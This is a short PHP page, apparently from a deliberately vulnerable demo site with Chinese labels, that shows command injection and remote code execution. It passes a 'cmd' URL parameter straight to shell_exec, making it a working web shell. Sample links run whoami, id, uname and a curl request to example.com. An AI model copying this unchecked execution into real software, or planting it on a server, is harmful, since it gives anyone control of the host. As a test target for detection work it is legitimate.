<?php

declare(strict_types=1);

require_once __DIR__ . "/bootstrap.php";

$cmd = $_GET["cmd"] ?? "";
$output = "";

if ($cmd !== "") {
    $output = (string) shell_exec($cmd . " 2>&1");
    if ($output === "") {
        $output = "[命令已执行，但没有输出]";
    }
}

ob_start();
?>
<section class="panel">
  <h2>命令执行演示</h2>
  <p>该页面把 <code>cmd</code> 参数直接交给系统 Shell 执行，可用于演示命令注入和 RCE。</p>
  <form method="get">
    <label>
      系统命令
      <input type="text" name="cmd" value="<?= demo_h($cmd) ?>" placeholder="whoami 或 uname -a">
    </label>
    <div class="button-row">
      <button type="submit">执行命令</button>
      <a class="back-link" href="shell.php">重置</a>
    </div>
  </form>
</section>

<section class="panel">
  <h2>快速测试</h2>
  <?= demo_examples([
      "执行 whoami" => "shell.php?cmd=whoami",
      "执行 id" => "shell.php?cmd=id",
      "执行 uname -a" => "shell.php?cmd=uname+-a",
      "下载执行特征" => "shell.php?cmd=curl+http://example.com",
  ]) ?>
</section>

<?php if ($cmd !== ""): ?>
<section class="panel">
  <h2>执行结果</h2>
  <pre><?= demo_h($output) ?></pre>
</section>
<?php endif; ?>
<?php
$content = ob_get_clean();
demo_render_page("RCE / 命令执行演示", "用于测试 cmd 参数、危险命令词和执行路径。", $content);
